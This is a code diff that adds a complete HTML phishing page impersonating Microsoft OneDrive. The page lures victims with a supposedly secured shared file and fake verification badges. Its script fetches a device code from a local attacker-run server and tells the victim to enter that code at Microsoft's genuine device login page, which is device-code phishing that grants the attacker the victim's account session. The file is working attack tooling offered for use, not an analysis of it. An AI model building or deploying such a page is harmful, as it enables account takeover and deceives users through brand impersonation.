@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>OneDrive – Verify Device Access</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap');
+
+    :root {
+      --od-blue:    #0078d4;
+      --od-blue2:   #106ebe;
+      --od-sky:     #00b4d8;
+      --od-teal:    #038387;
+      --od-dark:    #1b1b1f;
+      --od-mid:     #3b3a3c;
+      --od-muted:   #605e5c;
+      --od-subtle:  #a19f9d;
+      --od-border:  #e1dfdd;
+      --od-bg:      #f5f5f5;
+      --od-surface: #ffffff;
+      --od-green:   #107c10;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: var(--od-bg);
+      font-family: 'Outfit', 'Segoe UI', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 28px 16px 48px;
+    }
+
+    .wrapper {
+      width: 100%;
+      max-width: 620px;
+      background: var(--od-surface);
+      border-radius: 6px;
+      overflow: hidden;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.10), 0 1px 4px rgba(0,0,0,0.06);
+    }
+
+    /* ══ TOP STRIPE ══ */
+    .top-stripe {
+      height: 4px;
+      background: linear-gradient(90deg, #0078d4 0%, #038387 50%, #00b4d8 100%);
+    }
+
+    /* ══ HEADER ══ */
+    .header {
+      padding: 20px 32px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--od-border);
+      background: #fff;
+    }
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    /* OneDrive cloud logo */
+    .od-logo-wrap {
+      display: flex;
+      align-items: center;
+      gap: 9px;
+    }
+    .od-cloud {
+      width: 38px;
+      height: 28px;
+      flex-shrink: 0;
+    }
+    .od-wordmark {
+      display: flex;
+      flex-direction: column;
+      line-height: 1.1;
+    }
+    .od-wordmark .ms { font-size: 10px; font-weight: 500; color: var(--od-muted); letter-spacing: 0.3px; }
+    .od-wordmark .name { font-size: 17px; font-weight: 700; color: var(--od-dark); letter-spacing: -0.3px; }
+
+    .header-badge {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--od-green);
+      background: #f0f9f0;
+      border: 1px solid #c8e6c8;
+      border-radius: 99px;
+      padding: 4px 10px;
+    }
+
+    /* ══ HERO BANNER ══ */
+    .hero {
+      background: linear-gradient(135deg, #0f3460 0%, #0078d4 55%, #038387 100%);
+      padding: 0;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* subtle grid pattern overlay */
+    .hero::before {
+      content: '';
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(255,255,255,0.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,0.04) 1px, transparent 1px);
+      background-size: 32px 32px;
+    }
+
+    .hero-inner {
+      position: relative;
+      z-index: 1;
+      padding: 44px 32px 40px;
+      display: flex;
+      align-items: center;
+      gap: 28px;
+    }
+
+    .hero-icon-col {
+      flex-shrink: 0;
+    }
+    .hero-icon-ring {
+      width: 76px; height: 76px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.1);
+      border: 1.5px solid rgba(255,255,255,0.22);
+      display: flex; align-items: center; justify-content: center;
+      backdrop-filter: blur(4px);
+    }
+
+    .hero-text-col { flex: 1; }
+    .hero-eyebrow {
+      font-size: 10.5px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1.6px;
+      color: rgba(255,255,255,0.6);
+      margin-bottom: 8px;
+    }
+    .hero-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #fff;
+      line-height: 1.2;
+      margin-bottom: 10px;
+      letter-spacing: -0.4px;
+    }
+    .hero-title em {
+      font-style: normal;
+      color: #7dd3fc;
+    }
+    .hero-sub {
+      font-size: 13px;
+      color: rgba(255,255,255,0.75);
+      line-height: 1.65;
+      max-width: 340px;
+    }
+
+    /* ══ FILE CARD ══ */
+    .file-card-wrap {
+      padding: 0 32px;
+      margin-top: -1px;
+      background: #f0f8ff;
+      border-bottom: 1px solid #cce4f7;
+    }
+    .file-card {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 16px 0;
+    }
+    .file-icon-wrap {
+      width: 44px; height: 44px;
+      background: #fff;
+      border: 1px solid #c7e0f4;
+      border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      box-shadow: 0 1px 4px rgba(0,120,212,0.1);
+    }
+    .file-meta { flex: 1; min-width: 0; }
+    .file-name {
+      font-size: 13.5px;
+      font-weight: 600;
+      color: var(--od-dark);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .file-detail {
+      font-size: 11.5px;
+      color: var(--od-muted);
+      margin-top: 2px;
+    }
+    .file-lock {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 11px;
+      font-weight: 600;
+      color: #d83b01;
+      background: #fdf3f0;
+      border: 1px solid #f4b8a8;
+      border-radius: 99px;
+      padding: 4px 10px;
+      white-space: nowrap;
+      flex-shrink: 0;
+    }
+
+    /* ══ BODY ══ */
+    .body { padding: 30px 32px 24px; }
+
+    .intro {
+      font-size: 14px;
+      color: var(--od-mid);
+      line-height: 1.72;
+      margin-bottom: 28px;
+    }
+
+    /* ══ STEPS ══ */
+    .steps { margin-bottom: 28px; }
+    .step {
+      display: flex;
+      gap: 16px;
+      position: relative;
+    }
+    .step:not(:last-child)::after {
+      content: '';
+      position: absolute;
+      left: 14px; top: 34px;
+      width: 2px; height: calc(100% - 6px);
+      background: linear-gradient(to bottom, #cce4f7, #e8f4fd);
+    }
+    .step-num {
+      width: 28px; height: 28px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #0078d4, #038387);
+      color: #fff;
+      font-size: 12px; font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; margin-top: 2px;
+      position: relative; z-index: 1;
+      box-shadow: 0 2px 6px rgba(0,120,212,0.35);
+    }
+    .step-body { padding-bottom: 20px; }
+    .step-title { font-size: 13px; font-weight: 600; color: var(--od-dark); margin-bottom: 2px; }
+    .step-desc { font-size: 12px; color: var(--od-muted); line-height: 1.55; }
+    .step-desc a { color: var(--od-blue); text-decoration: none; font-weight: 600; }
+    .step-desc a:hover { text-decoration: underline; }
+
+    /* ══ CODE BOX ══ */
+    .code-section {
+      border-radius: 10px;
+      border: 1.5px solid #b3d9f5;
+      background: linear-gradient(160deg, #f0f8ff 0%, #e8f4fd 100%);
+      padding: 26px 24px 22px;
+      text-align: center;
+      margin-bottom: 22px;
+      position: relative;
+      overflow: hidden;
+    }
+    .code-section::before {
+      content: '';
+      position: absolute;
+      top: -30px; right: -30px;
+      width: 100px; height: 100px;
+      border-radius: 50%;
+      background: rgba(0,120,212,0.06);
+    }
+
+    .code-pill {
+      display: inline-block;
+      background: #fff;
+      border: 1px solid #c7e0f4;
+      border-radius: 99px;
+      padding: 3px 14px;
+      font-size: 10.5px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.3px;
+      color: var(--od-blue);
+      margin-bottom: 16px;
+    }
+
+    .code-display {
+      display: inline-flex;
+      align-items: center;
+      gap: 0;
+      border: 2.5px solid #0078d4;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-bottom: 18px;
+      box-shadow: 0 2px 12px rgba(0,120,212,0.18);
+      position: relative;
+      z-index: 1;
+    }
+
+    /* left accent bar */
+    .code-display::before {
+      content: '';
+      position: absolute;
+      left: 0; top: 0; bottom: 0;
+      width: 4px;
+      background: linear-gradient(to bottom, #0078d4, #038387);
+    }
+
+    .code-inner {
+      background: #fff;
+      padding: 14px 32px 14px 36px;
+      font-family: 'Courier New', Consolas, monospace;
+      font-size: 36px;
+      font-weight: 800;
+      color: #0078d4;
+      letter-spacing: 6px;
+      line-height: 1;
+      user-select: all;
+      min-width: 240px;
+      min-height: 64px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* skeleton */
+    .skel {
+      width: 210px;
+      height: 38px;
+      border-radius: 4px;
+      background: linear-gradient(90deg, #daeaf7 25%, #bfd8ee 50%, #daeaf7 75%);
+      background-size: 400% 100%;
+      animation: shimmer 1.3s infinite;
+      display: inline-block;
+    }
+    @keyframes shimmer {
+      0%   { background-position: 100% 0; }
+      100% { background-position: -100% 0; }
+    }
+
+    .code-hint { font-size: 11.5px; color: var(--od-muted); margin-bottom: 14px; }
+
+    .copy-btn {
+      display: inline-flex; align-items: center; gap: 7px;
+      padding: 8px 20px;
+      background: #fff;
+      border: 1.5px solid var(--od-blue);
+      border-radius: 5px;
+      color: var(--od-blue);
+      font-size: 12.5px; font-weight: 600;
+      font-family: 'Outfit', sans-serif;
+      cursor: pointer;
+      transition: background 0.15s, transform 0.1s;
+    }
+    .copy-btn:hover:not(:disabled) { background: #f0f6fd; transform: translateY(-1px); }
+    .copy-btn:disabled { opacity: 0.4; cursor: default; transform: none; }
+
+    .copied-toast {
+      display: none;
+      font-size: 11.5px; font-weight: 600;
+      color: var(--od-green);
+      margin-top: 10px;
+    }
+    .error-msg {
+      display: none;
+      font-size: 12px; color: #a4262c;
+      background: #fdf3f0;
+      border: 1px solid #f4b8a8;
+      border-radius: 5px;
+      padding: 10px 14px; margin-top: 12px;
+      text-align: left; line-height: 1.6;
+    }
+
+    /* ══ SESSION META ══ */
+    .session-meta {
+      text-align: center;
+      font-size: 10.5px;
+      font-family: Consolas, monospace;
+      color: var(--od-subtle);
+      margin-bottom: 20px;
+    }
+    .session-meta b { color: var(--od-muted); }
+
+    /* ══ URL CARD ══ */
+    .url-card {
+      background: #f8fbff;
+      border: 1px solid var(--od-border);
+      border-radius: 8px;
+      padding: 13px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      margin-bottom: 22px;
+    }
+    .url-left { display: flex; align-items: center; gap: 9px; min-width: 0; }
+    .url-text {
+      font-family: Consolas, monospace;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--od-dark);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    .url-go {
+      display: inline-flex; align-items: center; gap: 5px;
+      padding: 7px 16px;
+      background: linear-gradient(135deg, #0078d4, #038387);
+      color: #fff;
+      font-size: 12.5px; font-weight: 600;
+      font-family: 'Outfit', sans-serif;
+      text-decoration: none;
+      border-radius: 5px;
+      white-space: nowrap; flex-shrink: 0;
+      transition: opacity 0.15s, transform 0.1s;
+      box-shadow: 0 2px 8px rgba(0,120,212,0.25);
+    }
+    .url-go:hover { opacity: 0.9; transform: translateY(-1px); }
+
+    /* ══ CTA ══ */
+    .btn-cta {
+      display: block; width: 100%;
+      padding: 14px 20px;
+      background: linear-gradient(135deg, #0078d4 0%, #038387 100%);
+      color: #fff;
+      font-size: 15px; font-weight: 700;
+      font-family: 'Outfit', sans-serif;
+      text-align: center; text-decoration: none;
+      border: none; border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 16px;
+      letter-spacing: 0.1px;
+      box-shadow: 0 3px 14px rgba(0,120,212,0.3);
+      transition: opacity 0.15s, transform 0.1s;
+    }
+    .btn-cta:hover { opacity: 0.92; transform: translateY(-1px); }
+
+    /* ══ REFRESH ══ */
+    .refresh-row { text-align: center; margin-bottom: 26px; }
+    .btn-refresh {
+      display: inline-flex; align-items: center; gap: 7px;
+      padding: 8px 18px;
+      background: #fff;
+      border: 1.5px solid var(--od-border);
+      border-radius: 5px;
+      color: var(--od-mid);
+      font-size: 12.5px; font-weight: 600;
+      font-family: 'Outfit', sans-serif;
+      cursor: pointer;
+      transition: background 0.15s, border-color 0.15s;
+    }
+    .btn-refresh:hover:not(:disabled) { background: #f3f2f1; border-color: #b3b0ad; }
+    .btn-refresh:disabled { opacity: 0.4; cursor: default; }
+    .spin-icon { transition: transform 0.3s; }
+    @keyframes spin360 { to { transform: rotate(360deg); } }
+    .is-spinning .spin-icon { animation: spin360 0.7s linear infinite; }
+
+    /* ══ WARNING ══ */
+    .warn-strip {
+      display: flex; gap: 12px;
+      background: #fffbf0;
+      border: 1px solid #fde68a;
+      border-left: 3px solid #f59e0b;
+      border-radius: 0 6px 6px 0;
+      padding: 13px 15px;
+      margin-bottom: 24px;
+      font-size: 12.5px; color: var(--od-mid); line-height: 1.6;
+    }
+    .warn-strip svg { flex-shrink: 0; margin-top: 2px; }
+    .warn-strip a { color: var(--od-blue); text-decoration: none; }
+    .warn-strip a:hover { text-decoration: underline; }
+
+    .divider { height: 1px; background: var(--od-border); margin-bottom: 18px; }
+
+    .help-links { font-size: 12px; color: var(--od-muted); line-height: 1.9; }
+    .help-links a { color: var(--od-blue); text-decoration: none; }
+    .help-links a:hover { text-decoration: underline; }
+
+    /* ══ FOOTER ══ */
+    .footer {
+      background: #faf9f8;
+      border-top: 1px solid var(--od-border);
+      padding: 22px 32px;
+      text-align: center;
+    }
+    .footer-logos {
+      display: flex; align-items: center; justify-content: center;
+      gap: 6px; margin-bottom: 12px;
+    }
+    /* tiny MS grid */
+    .ms-grid {
+      display: grid; grid-template-columns: 1fr 1fr;
+      gap: 2px; width: 16px; height: 16px;
+    }
+    .ms-grid span { display: block; border-radius: 0.5px; }
+    .ms-grid .r { background: #f25022; }
+    .ms-grid .g { background: #7fba00; }
+    .ms-grid .b { background: #00a4ef; }
+    .ms-grid .y { background: #ffb900; }
+    .footer-sep { color: var(--od-border); font-size: 16px; }
+    .footer-copy {
+      font-size: 11px; color: var(--od-subtle); line-height: 1.8;
+    }
+    .footer-copy a { color: var(--od-blue); text-decoration: none; }
+  </style>
+</head>
+<body>
+
+<div class="wrapper">
+  <div class="top-stripe"></div>
+
+  <!-- ══ HEADER ══ -->
+  <div class="header">
+    <div class="od-logo-wrap">
+      <!-- OneDrive cloud SVG -->
+      <svg class="od-cloud" viewBox="0 0 38 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M22.5 10.5C21.7 6.8 18.4 4 14.5 4C10.1 4 6.5 7.6 6.5 12C6.5 12.2 6.5 12.4 6.5 12.6C4 13.4 2 15.7 2 18.5C2 21.8 4.7 24.5 8 24.5H30C33.3 24.5 36 21.8 36 18.5C36 15.5 33.8 13 31 12.5C30.5 11.3 29.4 10.3 28 10.1C27.1 7.4 24.5 5.5 21.5 5.5C21.5 7.1 22.2 8.5 23 9.5" fill="url(#od-grad)" opacity="0.9"/>
+        <path d="M22.5 10.5C21.7 6.8 18.4 4 14.5 4C10.1 4 6.5 7.6 6.5 12C6.5 12.2 6.5 12.4 6.5 12.6C4 13.4 2 15.7 2 18.5C2 21.8 4.7 24.5 8 24.5H30C33.3 24.5 36 21.8 36 18.5C36 15.5 33.8 13 31 12.5C30.5 11.3 29.4 10.3 28 10.1C27.1 7.4 24.5 5.5 21.5 5.5" fill="url(#od-grad2)"/>
+        <defs>
+          <linearGradient id="od-grad" x1="2" y1="4" x2="36" y2="24.5" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#0078d4"/>
+            <stop offset="100%" stop-color="#038387"/>
+          </linearGradient>
+          <linearGradient id="od-grad2" x1="2" y1="4" x2="36" y2="24.5" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#0078d4" stop-opacity="0.85"/>
+            <stop offset="100%" stop-color="#00b4d8" stop-opacity="0.9"/>
+          </linearGradient>
+        </defs>
+      </svg>
+      <div class="od-wordmark">
+        <span class="ms">Microsoft</span>
+        <span class="name">OneDrive</span>
+      </div>
+    </div>
+    <div class="header-badge">
+      <svg width="11" height="11" viewBox="0 0 14 14" fill="none">
+        <circle cx="7" cy="7" r="6" stroke="#107c10" stroke-width="1.2"/>
+        <path d="M4.5 7l1.8 1.8 3-3.6" stroke="#107c10" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      Verified Email
+    </div>
+  </div>
+
+  <!-- ══ HERO ══ -->
+  <div class="hero">
+    <div class="hero-inner">
+      <div class="hero-icon-col">
+        <div class="hero-icon-ring">
+          <!-- Shield + cloud lock icon -->
+          <svg width="38" height="38" viewBox="0 0 38 38" fill="none">
+            <path d="M19 4L6 9.5V19C6 26.2 11.7 32.8 19 34.5C26.3 32.8 32 26.2 32 19V9.5L19 4Z" fill="rgba(255,255,255,0.12)" stroke="rgba(255,255,255,0.45)" stroke-width="1.5"/>
+            <rect x="13" y="18" width="12" height="9" rx="1.5" stroke="white" stroke-width="1.5"/>
+            <path d="M15.5 18v-2.5a3.5 3.5 0 017 0V18" stroke="white" stroke-width="1.5" stroke-linecap="round"/>
+            <circle cx="19" cy="22.5" r="1.3" fill="white"/>
+            <path d="M19 23.8v1.5" stroke="white" stroke-width="1.3" stroke-linecap="round"/>
+          </svg>
+        </div>
+      </div>
+      <div class="hero-text-col">
+        <div class="hero-eyebrow">Secure File Access · Device Verification Required</div>
+        <div class="hero-title">A <em>secured file</em> has been<br>shared with you</div>
+        <div class="hero-sub">To view this OneDrive file, you must verify your device using Microsoft Authenticator. This ensures only authorised devices can access protected content.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ FILE CARD ══ -->
+  <div class="file-card-wrap">
+    <div class="file-card">
+      <div class="file-icon-wrap">
+        <!-- generic file / document icon in OneDrive blue -->
+        <svg width="26" height="26" viewBox="0 0 26 26" fill="none">
+          <rect x="4" y="2" width="13" height="22" rx="2" fill="#e8f4fd" stroke="#c7e0f4" stroke-width="1.2"/>
+          <path d="M13 2v6h6" stroke="#c7e0f4" stroke-width="1.2"/>
+          <path d="M17 2l6 6H17V2z" fill="#b3d9f5"/>
+          <line x1="7" y1="12" x2="16" y2="12" stroke="#0078d4" stroke-width="1.2" stroke-linecap="round"/>
+          <line x1="7" y1="15" x2="14" y2="15" stroke="#0078d4" stroke-width="1.2" stroke-linecap="round"/>
+          <line x1="7" y1="18" x2="12" y2="18" stroke="#0078d4" stroke-width="1.2" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <div class="file-meta">
+        <div class="file-name" id="filename">Shared Document</div>
+        <div class="file-detail">OneDrive · Shared with you · Access restricted</div>
+      </div>
+      <div class="file-lock">
+        <svg width="10" height="10" viewBox="0 0 12 12" fill="none">
+          <rect x="1.5" y="5.5" width="9" height="6" rx="1" stroke="#d83b01" stroke-width="1.2"/>
+          <path d="M3.5 5.5V4a2.5 2.5 0 015 0v1.5" stroke="#d83b01" stroke-width="1.2" stroke-linecap="round"/>
+        </svg>
+        Locked
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ BODY ══ -->
+  <div class="body">
+
+    <p class="intro">
+      Hello,<br><br>
+      Someone has shared a <strong>secured OneDrive file</strong> with you. To protect its contents, access requires device verification via Microsoft Authenticator. Complete the steps below to unlock the file.
+    </p>
+
+    <!-- Steps -->
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">Open the device login page</div>
+          <div class="step-desc">In any browser, navigate to <a href="https://login.microsoft.com/device" target="_blank" id="stepUrl">login.microsoft.com/device</a></div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <div class="step-title">Enter your device code</div>
+          <div class="step-desc">Type or paste the code shown below when prompted on the sign-in page.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">Sign in &amp; access the file</div>
+          <div class="step-desc">Once verified, your device will be authorised and the OneDrive file will unlock automatically.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Code box -->
+    <div class="code-section">
+      <div class="code-pill">Device Authentication Code</div>
+
+      <div class="code-display">
+        <div class="code-inner" id="deviceCode">
+          <span class="skel"></span>
+        </div>
+      </div>
+
+      <div class="code-hint">Use this code at the Microsoft device login page</div>
+
+      <button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
+        <svg width="13" height="13" viewBox="0 0 16 16" fill="none">
+          <rect x="5" y="5" width="9" height="10" rx="1.5" stroke="#0078d4" stroke-width="1.4"/>
+          <path d="M11 5V3.5A1.5 1.5 0 009.5 2h-6A1.5 1.5 0 002 3.5v8A1.5 1.5 0 003.5 13H5" stroke="#0078d4" stroke-width="1.4" stroke-linecap="round"/>
+        </svg>
+        Copy Code
+      </button>
+      <div class="copied-toast" id="copiedToast">✓ Copied to clipboard!</div>
+      <div class="error-msg" id="errorMsg"></div>
+    </div>
+
+    <!-- Session meta -->
+    <div class="session-meta" id="sessionMeta" style="display:none">
+      Session ID: <b id="sessionIdDisplay">—</b>
+    </div>
+
+    <!-- URL card -->
+    <div class="url-card">
+      <div class="url-left">
+        <svg width="15" height="15" viewBox="0 0 16 16" fill="none">
+          <rect x="3" y="7" width="10" height="8" rx="1.5" stroke="#107c10" stroke-width="1.4"/>
+          <path d="M5.5 7V5a2.5 2.5 0 015 0v2" stroke="#107c10" stroke-width="1.4" stroke-linecap="round"/>
+          <circle cx="8" cy="11" r="1" fill="#107c10"/>
+        </svg>
+        <span class="url-text" id="verificationUrlDisplay">login.microsoft.com/device</span>
+      </div>
+      <a href="https://login.microsoft.com/device" target="_blank" class="url-go" id="urlOpenBtn">Open Page →</a>
+    </div>
+
+    <!-- CTA -->
+    <a href="https://login.microsoft.com/device" target="_blank" class="btn-cta" id="authBtn">
+      Verify Device &amp; Access File →
+    </a>
+
+    <!-- Refresh -->
+    <div class="refresh-row">
+      <button class="btn-refresh" id="refreshBtn" onclick="fetchCode()">
+        <svg class="spin-icon" width="13" height="13" viewBox="0 0 16 16" fill="none">
+          <path d="M13.5 8a5.5 5.5 0 11-1.1-3.3" stroke="#3b3a3c" stroke-width="1.5" stroke-linecap="round"/>
+          <path d="M13.5 3v2.5H11" stroke="#3b3a3c" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        Request New Code
+      </button>
+    </div>
+
+    <!-- Warning -->
+    <div class="warn-strip">
+      <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+        <path d="M8 2L1 14h14L8 2z" stroke="#f59e0b" stroke-width="1.3" stroke-linejoin="round" fill="rgba(245,158,11,0.1)"/>
+        <path d="M8 6.5v3.5M8 11.5v1" stroke="#f59e0b" stroke-width="1.5" stroke-linecap="round"/>
+      </svg>
+      <span>
+        <strong>Only enter this code on the official Microsoft page.</strong> Microsoft and OneDrive will never ask for this code by email, phone, or chat. If you did not request file access, <a href="https://account.microsoft.com/security" target="_blank">secure your account</a> immediately.
+      </span>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="help-links">
+      <strong>Need help?</strong><br>
+      <a href="https://support.microsoft.com/onedrive">OneDrive help centre</a> &nbsp;·&nbsp;
+      <a href="https://support.microsoft.com/account-billing/sign-in-to-your-account-using-your-phone-or-another-device-ff5b4db8-9f53-4de8-b987-cdd0b667a4b3">About device sign-in</a> &nbsp;·&nbsp;
+      <a href="https://account.microsoft.com/security">Account security</a>
+    </div>
+
+  </div>
+
+  <!-- ══ FOOTER ══ -->
+  <div class="footer">
+    <div class="footer-logos">
+      <div class="ms-grid" aria-hidden="true">
+        <span class="r"></span><span class="g"></span>
+        <span class="b"></span><span class="y"></span>
+      </div>
+      <span style="font-size:12px;font-weight:600;color:#323130;">Microsoft</span>
+      <span class="footer-sep">·</span>
+      <svg width="18" height="14" viewBox="0 0 38 28" fill="none" style="display:inline-block;vertical-align:middle;">
+        <path d="M22.5 10.5C21.7 6.8 18.4 4 14.5 4C10.1 4 6.5 7.6 6.5 12C6.5 12.2 6.5 12.4 6.5 12.6C4 13.4 2 15.7 2 18.5C2 21.8 4.7 24.5 8 24.5H30C33.3 24.5 36 21.8 36 18.5C36 15.5 33.8 13 31 12.5C30.5 11.3 29.4 10.3 28 10.1C27.1 7.4 24.5 5.5 21.5 5.5" fill="url(#ft-grad)"/>
+        <defs>
+          <linearGradient id="ft-grad" x1="2" y1="4" x2="36" y2="24.5" gradientUnits="userSpaceOnUse">
+            <stop offset="0%" stop-color="#0078d4"/>
+            <stop offset="100%" stop-color="#038387"/>
+          </linearGradient>
+        </defs>
+      </svg>
+      <span style="font-size:12px;font-weight:600;color:#323130;">OneDrive</span>
+    </div>
+    <div class="footer-copy">
+      Microsoft Corporation · One Microsoft Way · Redmond, WA 98052<br>
+      <a href="#">Privacy Statement</a> &nbsp;·&nbsp;
+      <a href="#">Terms of Use</a> &nbsp;·&nbsp;
+      <a href="#">OneDrive Terms</a> &nbsp;·&nbsp;
+      <a href="#">Unsubscribe</a><br>
+      © 2025 Microsoft Corporation. All rights reserved.
+    </div>
+  </div>
+</div>
+
+<script>
+  const API_URL = 'http://127.0.0.1:3210/login-start';
+  let currentCode = null;
+
+  async function fetchCode() {
+    const refreshBtn = document.getElementById('refreshBtn');
+    const copyBtn    = document.getElementById('copyBtn');
+    const codeEl     = document.getElementById('deviceCode');
+    const errorEl    = document.getElementById('errorMsg');
+
+    // Reset UI
+    errorEl.style.display = 'none';
+    document.getElementById('copiedToast').style.display = 'none';
+    copyBtn.disabled = true;
+    refreshBtn.disabled = true;
+    refreshBtn.classList.add('is-spinning');
+    codeEl.innerHTML = '<span class="skel"></span>';
+
+    try {
+      const res = await fetch(API_URL, {
+        method: 'POST',
+        headers: { 'Accept': 'application/json' }
+      });
+      if (!res.ok) throw new Error(`HTTP ${res.status} ${res.statusText}`);
+
+      const data = await res.json();
+
+      // Code
+      currentCode = data.user_code;
+      codeEl.textContent = currentCode;
+      copyBtn.disabled = false;
+
+      // URL
+      const url = data.verification_url || 'https://login.microsoft.com/device';
+      const displayUrl = url.replace(/^https?:\/\//, '');
+      document.getElementById('verificationUrlDisplay').textContent = displayUrl;
+      document.getElementById('urlOpenBtn').href = url;
+      document.getElementById('authBtn').href = url;
+      document.getElementById('stepUrl').href = url;
+      document.getElementById('stepUrl').textContent = displayUrl;
+
+      // Filename (if server ever returns it)
+      if (data.filename_will_be) {
+        document.getElementById('filename').textContent = data.filename_will_be;
+      }
+
+      // Session
+      if (data.sessionId) {
+        document.getElementById('sessionIdDisplay').textContent = data.sessionId;
+        document.getElementById('sessionMeta').style.display = 'block';
+      }
+
+    } catch (err) {
+      currentCode = null;
+      codeEl.innerHTML = '<span style="font-size:14px;letter-spacing:0;color:#a4262c;font-family:Outfit,sans-serif">Could not load code</span>';
+      errorEl.style.display = 'block';
+      errorEl.innerHTML = `<strong>⚠ Unable to reach local server</strong><br>
+        Ensure <code style="background:#f3efee;padding:1px 5px;border-radius:3px">${API_URL}</code> is running, then click <em>Request New Code</em> to retry.<br>
+        <span style="color:#605e5c;font-size:11px">Error: ${err.message}</span>`;
+    } finally {
+      refreshBtn.disabled = false;
+      refreshBtn.classList.remove('is-spinning');
+    }
+  }
+
+  function copyCode() {
+    if (!currentCode) return;
+    navigator.clipboard.writeText(currentCode).then(() => {
+      const t = document.getElementById('copiedToast');
+      t.style.display = 'block';
+      setTimeout(() => { t.style.display = 'none'; }, 2500);
+    });
+  }
+
+  fetchCode();
+</script>
+</body>
+</html>
